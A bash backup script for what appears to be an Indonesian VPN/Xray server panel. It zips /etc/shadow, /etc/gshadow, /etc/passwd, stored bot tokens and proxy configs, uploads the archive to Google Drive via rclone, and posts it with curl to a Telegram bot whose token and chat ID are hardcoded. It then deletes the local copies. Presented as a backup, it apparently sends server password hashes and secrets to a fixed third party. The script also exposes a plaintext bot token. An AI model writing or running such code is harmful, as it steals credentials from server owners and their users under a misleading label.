#!/bin/bash
biji=`date +"%Y-%m-%d" -d "$dateFromServer"`
colornow=$(cat /etc/rmbl/theme/color.conf)
NC="\e[0m"
RED="\033[0;31m"
COLOR1="$(cat /etc/rmbl/theme/$colornow | grep -w "TEXT" | cut -d: -f2|sed 's/ //g')"
COLBG1="$(cat /etc/rmbl/theme/$colornow | grep -w "BG" | cut -d: -f2|sed 's/ //g')"
WH='\033[1;37m'
ipsaya=$(wget -qO- ifconfig.me)
clear
IP=$(curl -sS ipv4.icanhazip.com);
date=$(date +"%Y-%m-%d")
time=$(date +'%H:%M:%S')
domain=$(cat /etc/xray/domain)
token="7548411943:AAHyO064qk-MK596xgG--B--6qdzyB3hVhU"
id_chat="6430177985"
clear
sleep 1
echo -e "${COLOR1}[ INFO ] ${WH}Processing... "
mkdir -p /root/backup
echo -e "${COLOR1}[ INFO ] ${WH}Mohon Ditunggu... "
wget -O /root/backup/ipmini https://raw.githubusercontent.com/KANGGACOR9/permission/main/ipmini &> /dev/null
cp -r /etc/passwd /root/backup/ &> /dev/null
cp -r /etc/group /root/backup/ &> /dev/null
cp -r /etc/shadow /root/backup/ &> /dev/null
cp -r /etc/gshadow /root/backup/ &> /dev/null
cp -r /usr/bin/idchat /root/backup/ &> /dev/null
cp -r /usr/bin/token /root/backup/ &> /dev/null
cp -r /etc/per/id /root/backup/ &> /dev/null
cp -r /etc/per/token /root/backup/token2 &> /dev/null
cp -r /etc/perlogin/id /root/backup/loginid &> /dev/null
cp -r /etc/perlogin/token /root/backup/logintoken &> /dev/null
cp -r /etc/xray/config.json /root/backup/xray &> /dev/null
cp -r /etc/xray/ssh /root/backup/ssh &> /dev/null
cp -r /home/vps/public_html /root/backup/public_html &> /dev/null
cp -r /etc/xray/sshx /root/backup/sshx &> /dev/null
cp -r /etc/vmess /root/backup/vmess &> /dev/null
cp -r /etc/vless /root/backup/vless &> /dev/null
cp -r /etc/trojan /root/backup/trojan &> /dev/null
cp -r /etc/issue.net /root/backup/issue &> /dev/null
cd /root
zip -r $IP.zip backup > /dev/null 2>&1
zip -r $IP-$date.zip backup > /dev/null 2>&1
rclone copy /root/$IP-$date.zip dr:backup/
url=$(rclone link dr:backup/$IP-$date.zip)
id=(`echo $url | grep '^https' | cut -d'=' -f2`)
link="https://drive.google.com/u/4/uc?id=${id}&export=download"
curl -F chat_id="$id_chat" -F document=@"$IP.zip" -F caption="Thank You For Using this Script
Domain : $domain
IP VPS : $IP
Date   : $date
Time   : $time WIB
Link Google : $link" https://api.telegram.org/bot$token/sendDocument &> /dev/null
rm -fr /root/backup &> /dev/null
rm -fr /root/user-backup &> /dev/null
rm -f /root/$NameUser.zip &> /dev/null
rm -r /root/$IP-$date.zip &> /dev/null
rm -f /root/$IP.zip &> /dev/null
echo " Please Check Your BOT"
echo -e ""
read -n 1 -s -r -p "Press any key to back on menu"
menu
